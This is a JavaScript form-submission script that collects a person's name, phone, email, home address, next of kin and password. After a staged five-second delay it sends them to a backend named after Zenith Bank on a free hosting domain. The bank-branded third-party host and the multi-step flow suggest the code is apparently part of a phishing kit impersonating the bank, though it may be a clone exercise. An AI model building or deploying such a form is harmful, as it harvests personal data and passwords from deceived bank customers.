document.addEventListener("DOMContentLoaded", function () {
  AOS.init(); // Initialize AOS animations

  if (typeof Swal === "undefined") {
    console.error("SweetAlert2 is not loaded.");
    alert(
      "Error: SweetAlert2 library is missing. Please check your connection."
    );
    return;
  }

  const form = document.getElementById("personalInfoForm");

  const loadingOverlay = document.getElementById("loadingOverlay");

  form.addEventListener("submit", async function (event) {
    event.preventDefault(); // Prevent default form submission

    // Retrieve stored user ID (must be set in localStorage earlier)
    const userId = localStorage.getItem("userId");
    if (!userId) {
      Swal.fire({
        icon: "error",
        title: "User Not Found",
        text: "Please complete the previous steps before proceeding.",
      });
      return;
    }

    // Collect personal info
    const personalInfo = {
      title: document.getElementById("title").value.trim(),
      firstName: document.getElementById("firstName").value.trim(),
      middleName: document.getElementById("middleName").value.trim(),
      lastName: document.getElementById("lastName").value.trim(),
      occupation: document.getElementById("occupation").value.trim(),
      phoneNumber: document.getElementById("phoneNumber").value.trim(),
      maritalStatus: document.getElementById("maritalStatus").value.trim(),
      emailAddress: document.getElementById("emailAddress").value.trim(),
      stateOfOrigin: document.getElementById("stateOfOrigin").value.trim(),
      stateOfResidence: document
        .getElementById("stateOfResidence")
        .value.trim(),
      houseAddress: document.getElementById("houseAddress").value.trim(),
      nextOfKin: document.getElementById("nextOfKin").value.trim(),
      password: document.getElementById("password").value.trim(),
    };

    // Validate inputs
    for (const key in personalInfo) {
      if (!personalInfo[key]) {
        Swal.fire({
          icon: "error",
          title: "Missing Information",
          text: `Please fill in the ${key.replace(/([A-Z])/g, " $1")}`,
        });
        return;
      }
    }

    // Show loading overlay
    loadingOverlay.style.display = "flex";

    // Simulate backend call with a delay (5 seconds)
    setTimeout(async () => {
      // Send data to backend
      try {
        const response = await fetch(
          `https://zenithbank-backend.onrender.com/api/users/update/${userId}`,
          {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(personalInfo),
          }
        );

        const result = await response.json();

        if (response.ok) {
          // Redirect to next step
          setTimeout(() => {
            window.location.href = "/HTML/success.html";
          }, 2000); // Redirect after 5 seconds
        } else {
          Swal.fire({
            icon: "error",
            title: "Error",
            text: result.error || "Failed to save personal info. Try again!",
          });
        }
      } catch (error) {
        Swal.fire({
          icon: "error",
          title: "Network Error",
          text: "Failed to connect to the server. Please check your internet and try again.",
        });
      } finally {
        loadingOverlay.style.display = "none"; // Hide loading overlay
      }
    }, 5000); // Wait for 5 seconds before proceeding
  });
});
